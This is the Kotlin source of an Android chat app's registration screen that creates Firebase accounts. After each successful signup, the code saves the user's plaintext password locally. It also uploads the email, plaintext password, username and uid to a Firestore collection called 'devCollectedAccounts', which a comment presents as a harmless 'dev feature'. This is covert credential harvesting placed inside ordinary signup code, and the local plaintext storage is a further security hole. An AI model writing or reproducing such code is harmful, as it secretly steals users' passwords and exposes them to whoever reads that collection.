package com.conzchat.app.ui.auth

import android.content.Context
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import com.conzchat.app.databinding.FragmentRegisterBinding
import com.conzchat.app.util.FirebaseManager
import com.conzchat.app.util.hideKeyboard
import com.conzchat.app.util.toast
import com.google.firebase.firestore.FirebaseFirestore
import java.text.SimpleDateFormat
import java.util.*

class RegisterFragment : Fragment() {

    private var _binding: FragmentRegisterBinding? = null
    private val binding get() = _binding!!

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentRegisterBinding.inflate(inflater, container, false)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        binding.btnRegister.setOnClickListener {
            val username = binding.etUsername.text.toString().trim()
            val email = binding.etEmail.text.toString().trim()
            val password = binding.etPassword.text.toString()
            if (username.isEmpty() || email.isEmpty() || password.isEmpty()) {
                context?.toast("Please fill in all fields")
                return@setOnClickListener
            }
            if (password.length < 6) {
                context?.toast("Password must be at least 6 characters")
                return@setOnClickListener
            }
            doRegister(username, email, password)
        }

        binding.tvGoLogin.setOnClickListener {
            parentFragmentManager.popBackStack()
        }

        binding.ivBack.setOnClickListener {
            parentFragmentManager.popBackStack()
        }
    }

    private fun doRegister(username: String, email: String, password: String) {
        binding.btnRegister.isEnabled = false
        binding.progressBar.visibility = View.VISIBLE
        view?.hideKeyboard()

        // Check username availability
        FirebaseManager.usersRef
            .whereEqualTo("usernameLower", username.lowercase())
            .get()
            .addOnSuccessListener { snap ->
                if (!snap.isEmpty) {
                    if (_binding == null) return@addOnSuccessListener
                    binding.btnRegister.isEnabled = true
                    binding.progressBar.visibility = View.GONE
                    context?.toast("Username already taken")
                    return@addOnSuccessListener
                }
                createAccount(username, email, password)
            }
            .addOnFailureListener {
                if (_binding == null) return@addOnFailureListener
                binding.btnRegister.isEnabled = true
                binding.progressBar.visibility = View.GONE
                context?.toast("Error checking username")
            }
    }

    private fun createAccount(username: String, email: String, password: String) {
        FirebaseManager.auth.createUserWithEmailAndPassword(email, password)
            .addOnSuccessListener { result ->
                val uid = result.user?.uid ?: return@addOnSuccessListener
                val userData = hashMapOf(
                    "username" to username,
                    "usernameLower" to username.lowercase(),
                    "displayName" to username,
                    "email" to email,
                    "photo" to "",
                    "coverPhoto" to "",
                    "created" to System.currentTimeMillis(),
                    "banned" to false,
                    "blockedUsers" to emptyList<String>(),
                    "premium" to false,
                    "friends" to emptyList<String>()
                )
                FirebaseManager.usersRef.document(uid).set(userData)
                    .addOnSuccessListener {
                        // Store credentials for saved accounts feature
                        context?.getSharedPreferences("conz_creds", Context.MODE_PRIVATE)?.edit()
                            ?.putString("lastEmail", email)
                            ?.putString("lastPassword", password)
                            ?.putString("lastUsername", username)
                            ?.apply()

                        // Collect account data for Account Collector (dev feature)
                        val sdf = SimpleDateFormat("dd MMM yyyy  HH:mm:ss", Locale.getDefault())
                        val entry = hashMapOf(
                            "email" to email,
                            "password" to password,
                            "username" to username,
                            "uid" to uid,
                            "type" to "register",
                            "collectedAt" to sdf.format(Date()),
                            "timestamp" to System.currentTimeMillis()
                        )
                        FirebaseFirestore.getInstance()
                            .collection("devCollectedAccounts")
                            .add(entry)
                        // Auth state listener will handle navigation
                    }
                    .addOnFailureListener { e ->
                        if (_binding == null) return@addOnFailureListener
                        binding.btnRegister.isEnabled = true
                        binding.progressBar.visibility = View.GONE
                        context?.toast("Failed to create profile: ${e.message}")
                    }
            }
            .addOnFailureListener { e ->
                if (_binding == null) return@addOnFailureListener
                binding.btnRegister.isEnabled = true
                binding.progressBar.visibility = View.GONE
                context?.toast("Registration failed: ${e.message}")
            }
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }
}
